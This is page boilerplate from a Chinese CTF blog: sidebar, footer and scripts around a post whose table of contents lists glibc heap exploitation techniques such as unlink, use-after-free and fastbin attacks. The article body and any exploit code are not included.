href="https://github.com/uf4te/uf4te.github.io"><i class="fab fa-github"></i><span>给我的网站一个star 🤗</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:916884674@qq.com" target="_blank" title="mail 我的邮箱"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/img/me/QRCode_QQ.png" target="_blank" title="加我 QQ"><i class="fa-brands fa-qq"></i></a><a class="social-icon" href="/img/me/QRCode_WeChat.png" target="_blank" title="加我微信"><i class="fa-brands fa-weixin"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS 订阅"><i class="fa-solid fa-square-rss"></i></a><a class="social-icon" href="/about/#reward-me" target="_blank" title="赞助本站"><i class="fa-sharp fa-solid fa-heart-circle-bolt"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fa-solid fa-medal"></i><span>欢迎来到我的小站</span></div><div class="announcement_content">我是一个喜欢学习 PWN 和逆向的二进制 CTFer，加油，互勉！</div><div style="margin-bottom:8px"></div><div class="item-headline"><i class="fa-solid fa-hourglass-half fa-shake"></i><span>计时小助手</span></div><div id="timing"></div><div style="margin-bottom:8px"></div><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>最新公告</span></div><div class="newest_announcement_content">可以在《互动 -&gt; 我的说说》下查看本站的更新及动态：<a href="https://www.uf4te.cn/artitalk/" target="_blank" title="点击直达">我的说说</a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="toc-text">堆溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%AD%A5%E9%AA%A4"><span class="toc-text">关键步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%A0%86%E5%88%86%E9%85%8D%E5%87%BD%E6%95%B0"><span class="toc-text">寻找堆分配函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">寻找危险函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%A1%AB%E5%85%85%E9%95%BF%E5%BA%A6"><span class="toc-text">确定填充长度</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Off-By-One"><span class="toc-text">Off-By-One</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-text">产生原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98"><span class="toc-text">相关例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chunk-Extend-and-Overlap"><span class="toc-text">Chunk Extend and Overlap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9-inuse-%E7%9A%84-fast-bin-%E8%BF%9B%E8%A1%8C-extend"><span class="toc-text">对 inuse 的 fast bin 进行 extend</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9-inuse-%E7%9A%84-small-bin-%E8%BF%9B%E8%A1%8C-extend"><span class="toc-text">对 inuse 的 small bin 进行 extend</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9-free-%E7%9A%84-small-bin-%E8%BF%9B%E8%A1%8C-extend"><span class="toc-text">对 free 的 small bin 进行 extend</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-extend-%E5%90%8E%E5%90%91-Overlap"><span class="toc-text">通过 extend 后向 Overlap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-extend-%E5%89%8D%E5%90%91-Overlap"><span class="toc-text">通过 extend 前向 Overlap</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unlink"><span class="toc-text">Unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89%E9%98%B2%E6%8A%A4%E7%9A%84-unlink"><span class="toc-text">没有防护的 unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8%E9%98%B2%E6%8A%A4%E7%9A%84-unlink"><span class="toc-text">存在防护的 unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-1"><span class="toc-text">利用思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Use-After-Free"><span class="toc-text">Use After Free</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fast-bin-Attack"><span class="toc-text">Fast bin Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-Free"><span class="toc-text">Double Free</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-Of-Spirit"><span class="toc-text">House Of Spirit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alloc-to-Stack"><span class="toc-text">Alloc to Stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Arbitrary-Alloc"><span class="toc-text">Arbitrary Alloc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unsorted-bin-Attack"><span class="toc-text">Unsorted bin Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsorted-bin-Leak"><span class="toc-text">Unsorted bin Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-malloc-trim-%E5%BE%97%E5%88%B0%E5%81%8F%E7%A7%BB"><span class="toc-text">通过 __malloc_trim() 得到偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-malloc-hook-%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB"><span class="toc-text">通过 __malloc_hook 计算偏移</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsorted-bin-Attack-1"><span class="toc-text">Unsorted bin Attack</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Large-bin-Attack"><span class="toc-text">Large bin Attack</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/f5dbafd0.html" title="AFL++环境搭建与模糊测试"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-135.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="AFL++环境搭建与模糊测试"></a><div class="content"><a class="title" href="/posts/f5dbafd0.html" title="AFL++环境搭建与模糊测试">AFL++环境搭建与模糊测试</a><time datetime="2024-10-14T15:06:13.000Z" title="发表于 2024-10-14 23:06:13">2024-10-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/194d06e.html" title="U盘重装系统以及Ubuntu与Windows双系统"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-134.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="U盘重装系统以及Ubuntu与Windows双系统"></a><div class="content"><a class="title" href="/posts/194d06e.html" title="U盘重装系统以及Ubuntu与Windows双系统">U盘重装系统以及Ubuntu与Windows双系统</a><time datetime="2024-09-28T04:30:04.000Z" title="发表于 2024-09-28 12:30:04">2024-09-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/bb411a4c.html" title="多架构与交叉编译"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-133.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="多架构与交叉编译"></a><div class="content"><a class="title" href="/posts/bb411a4c.html" title="多架构与交叉编译">多架构与交叉编译</a><time datetime="2024-06-16T14:48:33.000Z" title="发表于 2024-06-16 22:48:33">2024-06-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f0cbf9ee.html" title="IOT固件仿真与gdbserver远程调试"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-132.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="IOT固件仿真与gdbserver远程调试"></a><div class="content"><a class="title" href="/posts/f0cbf9ee.html" title="IOT固件仿真与gdbserver远程调试">IOT固件仿真与gdbserver远程调试</a><time datetime="2024-06-16T14:16:49.000Z" title="发表于 2024-06-16 22:16:49">2024-06-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/c2233a9.html" title="CNVD-2013-11625复现"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-131.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="CNVD-2013-11625复现"></a><div class="content"><a class="title" href="/posts/c2233a9.html" title="CNVD-2013-11625复现">CNVD-2013-11625复现</a><time datetime="2024-06-12T13:03:01.000Z" title="发表于 2024-06-12 21:03:01">2024-06-12</time></div></div></div></div><div class="card-widget" id="card-newest-comments"><div class="item-headline"><i class="fas fa-comment-dots"></i><span>最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">©2023 - 2025 By uf4te</div><div class="framework-info"><span>框架</span> <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题</span> <a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div id="running-time"></div><script id="LA-DATA-WIDGET" crossorigin="anonymous" charset="UTF-8" src="https://v6-widget.51.la/v6/3GoBenqrrrBby5er/quote.js?theme=#1690FF,#00C4B6,#CACACA,#00C4B6,#FFFFFF,#1690FF,14&amp;f=12"></script><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" title="博客框架 Hexo_v6.3.0"></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" title="主题版本 Butterfly_v4.7.0"></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vercel-black?style=flat&amp;logo=Vercel" title="本站采用多线部署，主线路部署于 Vercel"></a><a class="github-badge" target="_blank" href="https://www.cloudflare.com/zh-cn/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Cloudflare-F38020?style=flat&amp;logo=Cloudflare" title="本站采用多线部署，备用线路部署于 Cloudflare"></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" title="本站项目主要由 Github 托管与备份"></a><a class="github-badge" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-FF3030?style=flat&amp;logo=Claris" title="本站采用知识共享署名 - 非商业性使用 - 相同方式共享 4.0 国际许可协议进行许可"></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20240052" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/%E8%90%8CICP%E5%A4%87-20240052%E5%8F%B7-fe1384?style-flat&amp;logo=data:image/png;base64,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" title="本站已通过萌备备案：萌ICP备20240052号"></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="go-down" type="button" title="刷新页面" onclick="window.location.reload()"><i class="fa-solid fa-arrows-rotate"></i></button><button id="readmode" type="button" title="阅读模式"><i class="fa-solid fa-book-open-reader"></i></button><button id="translateLink" type="button" title="繁简切换">繁</button><button id="darkmode" type="button" title="昼夜切换"><i class="fa-solid fa-moon"></i></button><button id="hide-aside-btn" type="button" title="全屏模式" onclick="rmf.fullScreen()"><i class="fas fa-expand"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fa fa-comments"></i></a><button id="go-down" type="button" title="分享本页" onclick="rmf.copyWordsLink()"><i class="fa-solid fa-share-from-square"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight,500)"><i class="fas fa-arrow-down"></i></button></div></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" title="后退一步" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" title="前进一步" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" title="刷新页面" href="javascript:window.location.reload();"><i class="fa fa-refresh"></i></a><a class="rightMenu-item" title="直达顶部" href="javascript:btf.scrollToDest(0, 500)"><i class="fa fa-arrow-up"></i></a><a class="rightMenu-item" title="直达底部" href="javascript:btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" href="/archives/"><i class="fa-solid fa-calendar-days"></i><span>文章归档</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="fas fa-tags"></i><span>文章标签</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="fas fa-folder-open"></i><span>文章分类</span></a><a class="rightMenu-item" href="javascript:toRandomPost()"><i class="fa fa-paper-plane"></i><span>随便逛逛</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>复制</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://www.bing.com/search?q=&quot;+window.getSelection().toString());window.location.reload();"><i class="fa-brands fa-edge"></i><span>用Bing搜索</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());window.location.reload();"><i class="fa fa-link"></i><span>转到链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste()"><i class="fa fa-copy"></i><span>粘贴</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-post"><a class="rightMenu-item" href="#post-comment"><i class="fa fa-comments"></i><span>直达评论</span></a><a class="rightMenu-item" href="javascript:rmf.copyWordsLink()"><i class="fa fa-link"></i><span>复制本文地址</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-to"><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>新窗口打开</span></a><a class="rightMenu-item" id="menu-too" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>转到链接</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>保存图片</span></a><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>在新窗口打开</span></a><a class="rightMenu-item" href="javascript:rmf.click()"><i class="fa fa-arrows-alt"></i><span>全屏显示</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制图片链接</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:rmf.switchDarkMode();"><i class="fa fa-moon"></i><span>昼夜切换</span></a><a class="rightMenu-item menu-link" href="/copyright/"><i class="fa-solid fa-copyright"></i><span>本站协议</span></a><a class="rightMenu-item menu-link" href="/about/#reward-me"><i class="fa-sharp fa-solid fa-heart-circle-bolt"></i><span>赞助本站</span></a><a class="rightMenu-item menu-link" href="/about/"><i class="fa-regular fa-address-card"></i><span>关于本站</span></a></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadWaline(){function e(){Waline.init(Object.assign({el:"#waline-wrap",reaction:!0,serverURL:"https://waline.uf4te.cn",avatarCDN:"https://cn.cravatar.com/avatar/",pageview:!0,dark:'html[data-theme="dark"]',path:window.location.pathname,comment:!0,reaction:["https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_wink.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_blush.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_think.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_awkward.png"]},{locale:{nick:"昵称 (选填)",mail:"邮箱 (建议填写)",link:"你的主页 (选填)",placeholder:"请文明发言，牢记社会主义核心价值观！（不填写昵称和邮箱可以匿名评论，但建议填写邮箱可在被回复时收到邮件提醒，邮箱信息不会被公开）",requiredMeta:[],sofa:"有什么想说的？快来发表评论抢沙发吧！",login:"登录 (可选)",anonymous:"某不知名网友",level0:"潜水",level1:"冒泡",level2:"吐槽",level3:"活跃",level4:"话痨",level5:"传说",reactionTitle:"感觉怎么样，评价一下？",reaction0:"感觉很赞",reaction1:"支持一下",reaction2:"感觉一般",reaction3:"勉勉强强"}}))}const n=document.getElementById("waline-css");"object"==typeof Waline?n?e():getCSS("/css/waline.css","waline-css").then(e):getCSS("/css/waline.css","waline-css").then((()=>{getScript("/js/waline.js").then(e)}))}{function loadOtherComment(){loadWaline()}setTimeout(loadWaline,0)}</script></div><script>window.addEventListener("load",(()=>{const e=e=>{let t="";if(e.length)for(let n=0;n<e.length;n++){t+="<div class='aside-list-item'>";{const a="data-lazy-src";t+=`<a href='${e[n].url}' class='thumbnail'><img ${a}='${e[n].avatar}' alt='${e[n].nick}'></a>`}t+=`<div class='content'>\n        <a class='comment' href='${e[n].url}' title='${e[n].content}'>${e[n].content}</a>\n        <div class='name'><span>${e[n].nick} / </span><time datetime="${e[n].date}">${btf.diffDate(e[n].date,!0)}</time></div>\n        </div></div>`}else t+="没有评论";let n=document.querySelector("#card-newest-comments .aside-list");n.innerHTML=t,window.lazyLoadInstance&&window.lazyLoadInstance.update(),window.pjax&&window.pjax.refresh(n)},t=()=>{if(document.querySelector("#card-newest-comments .aside-list")){const t=saveToLocal.get("waline-newest-comments");t?e(JSON.parse(t)):(()=>{const t=()=>{Waline.RecentComments({serverURL:"https://waline.uf4te.cn",count:13}).then((({comments:t})=>{let n=t.filter((e=>"uf4te"!==e.nick));n.length<3&&(n=n.concat(t.filter((e=>"uf4te"===e.nick)).slice(0,3-n.length)));const a=n.slice(0,3).map((e=>{return{content:(t=e.comment,""===t||(t=(t=(t=(t=t.replace(/<img.*?src="(.*?)"?[^\>]+>/gi,"[图片]")).replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi,"[链接]")).replace(/<pre><code>.*?<\/pre>/gi,"[代码]")).replace(/<[^>]+>/g,"")).length>150&&(t=t.substring(0,150)+"..."),t),avatar:e.avatar,nick:e.nick,url:e.url+"#"+e.objectId,date:e.insertedAt};var t}));saveToLocal.set("waline-newest-comments",JSON.stringify(a),10/1440),e(a)})).catch((e=>{document.querySelector("#card-newest-comments .aside-list").innerHTML="无法获取评论，请确认相关配置是否正确"}))};"object"==typeof Waline?t():getScript("/js/waline.js").then(t)})()}};t(),document.addEventListener("pjax:complete",t)}))</script><script src="/js/jquery.min.js"></script><script src="/js/sakura.js"></script><script data-pjax="" src="/js/footer_beautification.js"></script><canvas id="universe"></canvas><script src="/js/universe.js"></script><script src="/js/title.js"></script><script async data-pjax="" src="/js/fps.js"></script><script async data-pjax="" src="/js/txmap.js"></script><script src="/js/console.js"></script><script src="/js/hotsearch.js"></script><div class="aplayer no-destroy" data-id="8252365535" data-server="netease" data-type="playlist" data-order="random" data-fixed="true" data-autoplay="false" data-theme="#00C4B6" data-volume="0.8" data-mutex="true" data-listmaxheight="330px"></div><script src="//npm.elemecdn.com/pace-js@1.2.4/pace.min.js"></script><script async data-pjax="" src="/js/timing.js"></script><script data-pjax="" src="/js/rightmenu.js"></script><script src="/js/random.js"></script><script src="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/jinrishici.js"></script><script data-pjax="" src="/js/poem.js"></script><script src="/js/chuckle-post-ai.js"></script><script data-pjax="" defer>new ChucklePostAI({el:"#post>#article-container",key:"e3524467cea76d785e9a",title_el:".post-title",interface:{name:"uf4te 的 AI 小助手",introduce:"Hey，你好！很高兴见到你！我是 uf4te 的文章辅助 AI，点击下方的按钮，我可以为你生成本文摘要、推荐相关文章（首次生成可能会比较慢，请您耐心等待一小会，谢谢理解哦~）",version:"GPT-3.5",button:["介绍自己","推荐相关文章","生成本文摘要","矩阵穿梭"]},hide_shuttle:!0,pjax:!0,summary_toggle:!1,summary_speech:!0})</script><script data-pjax="" src="/js/random-friends-post.js"></script><script data-pjax="" src="/js/pagination.js"></script><script async data-pjax="" src="/js/commentsum.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="♡富强♡,♡民主♡,♡文明♡,♡和谐♡,♡自由♡,♡平等♡,♡公正♡,♡法治♡,♡爱国♡,♡敬业♡,♡诚信♡,♡友善♡" data-fontsize="16px" data-random="false" async></script><link rel="stylesheet" href="/js/APlayer/APlayer.min.css" media="print" onload='this.media="all"'><script src="/js/APlayer/APlayer.min.js"></script><script src="/js/APlayer/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors=["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new 